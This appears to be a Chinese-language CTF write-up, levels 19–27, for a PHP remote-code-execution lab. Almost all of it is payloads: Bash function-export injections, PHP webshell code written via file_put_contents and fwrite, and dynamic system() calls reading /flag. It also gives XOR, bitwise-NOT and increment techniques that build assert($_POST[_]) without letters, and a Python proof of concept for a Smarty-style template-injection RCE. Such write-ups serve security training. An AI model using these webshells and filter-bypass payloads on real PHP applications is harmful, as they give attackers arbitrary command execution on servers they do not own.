- Bash 4.4以前：`env $'BASH_FUNC_echo()=() { id; }' bash -c "echo hello"`
- Bash 4.4及以上：`env $'BASH_FUNC_echo%%=() { id; }' bash -c 'echo hello'`

```
<@URLencode>?envs[BASH_FUNC_echo%%]=() { cat /flag; }<@URLencode>
?envs[BASH_FUNC_echo%25%25]=()%20{%20cat%20/flag;%20}
```

Level 19 : 文件写入导致的RCE 

| 函数                | 说明                                                         | 示例代码                                                     |
| ------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| `file_put_contents` | 将字符串写入文件，如果文件不存在会尝试创建。适用于快速简单地写入数据到文件。 | `file_put_contents('example.php', '<?php eval($_GET[helloctf]); ?>');` |
| `fwrite/fputs`      | 向一个打开的文件流写入数据，适用于需要更细粒度的控制文件操作的场景。 | `$fp = fopen('example.php', 'w'); fwrite($fp, '<?php eval($_GET[helloctf]); ?>'); fclose($fp);` |
| `fprintf`           | 类似于 `fwrite`，但提供格式化功能，允许按照特定格式写入数据到文件流。适用于需要格式化写入的场景。 | `$fp = fopen('example.php', 'w'); fprintf($fp, '<?php eval($_GET[helloctf]); ?>'); fclose($fp);` |

Level 20 : 文件上传导致的RCE 

没有做任何waf 直接上传webshell执行命令即可

![image-20241012101025925](C:\Users\右京\AppData\Roaming\Typora\typora-user-images\image-20241012101025925.png)

Level 21 : 文件包含导致的RCE 



Level 22 : PHP 特性 - 动态调用 

?a=system&b=cat /flag

Level 23 : PHP 特性 - 自增

 

Level 24 : PHP 特性 - 无参命令执行 

?code=var_dump(scandir(current(localeconv())));

得到数组array(6) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(8) "flag.php" [3]=> string(12) "get_flag.php" [4]=> string(9) "index.php" [5]=> string(7) "uploads" } 

?code=show_source(array_rand(array_flip(scandir(current(localeconv())))));

`array_rand(array_flip())`，`array_flip()`是交换数组的键和值，`array_rand()`是随机返回一个数组,多刷新几次就出来了

Level 25 : PHP 特性 - 取反绕过 

上一题的payload，反转完了多刷新几次就得到了get_flag.php

Level 26 : PHP 特性 - 无字母数字的代码执行

两种解法

第一种是异或

$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); 
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); 
$___=$$__;
$_($___[_]);//assert($_POST[_]);

或者

$_ = "!((%)("^"@[[@[\\";   $__ = "!+/(("^"~{`{|";   $___ = $$__;   $_($___[_]); 

第二种是取反

$_ = ~"%9e%8c%8c%9a%8d%8b";   //得到assert，此时$_="assert"_

_$__ = ~"%a0%af%b0%ac%ab";   //得到_POST，此时$__="_POST"___

___$___ = $$__;   //$___=$_POST_

_$_($___[_]); 

方法三:自增自减

```
<?php
$_=[].'';   //得到"Array"
$___ = $_[$__];   //得到"A"，$__没有定义，默认为False也即0，此时$___="A"
$__ = $___;   //$__="A"
$_ = $___;   //$_="A"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"S"，此时$__="S"
$___ .= $__;   //$___="AS"
$___ .= $__;   //$___="ASS"
$__ = $_;   //$__="A"
$__++;$__++;$__++;$__++;   //得到"E"，此时$__="E"
$___ .= $__;   //$___="ASSE"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__;$__++;   //得到"R"，此时$__="R"
$___ .= $__;   //$___="ASSER"
$__++;$__++;   //得到"T"，此时$__="T"
$___ .= $__;   //$___="ASSERT"
$__ = $_;   //$__="A"
$____ = "_";   //$____="_"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"P"，此时$__="P"
$____ .= $__;   //$____="_P"
$__ = $_;   //$__="A"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"O"，此时$__="O"
$____ .= $__;   //$____="_PO"
$__++;$__++;$__++;$__++;   //得到"S"，此时$__="S"
$____ .= $__;   //$____="_POS"
$__++;   //得到"T"，此时$__="T"
$____ .= $__;   //$____="_POST"
$_ = $$____;   //$_=$_POST
$___($_[_]);   //ASSERT($POST[_])
```

方法四：通配符（本题不可行）

```
code=?><?=`??? ???`?>
```

code=?><?=`??? ???/???/????/???_????.???`?>

都抓不到flag 或者get_flag.php

Level 27 : PHP - 模板注入导致的RCE

idekctf 2024 [idekCTF 2024 报道 - Hamayan Hamayan](https://blog.hamayanhamayan.com/entry/2024/08/20/092636)

偷的别人的poc[Idek ctf 2024 网络文章（后续） (zenn.dev)](https://zenn.dev/tchen/articles/83f26ca77948fa)

import hashlib
import requests
from urllib.parse import quote

URL = "填你自己的"
cwd = '/app'



target_file = '../{Closure::fromCallable(system)->__invoke("cat /flag-*")}/../../pages/about'
w1 = requests.get(URL + "?page=" + quote(target_file))
print(w1.status_code)
print(w1.text)



filehash = hashlib.sha1(f"//{cwd}/pages/{target_file}{cwd}/templates/".encode())
template_c_file = filehash.hexdigest() + "_0.file_" + target_file.split("/")[-1] + ".php"
template_c_file_path = "../templates_c/" + template_c_file

w2 = requests.get(URL + "?page=" + template_c_file_path)
print(w2.status_code)
print(w2.text)
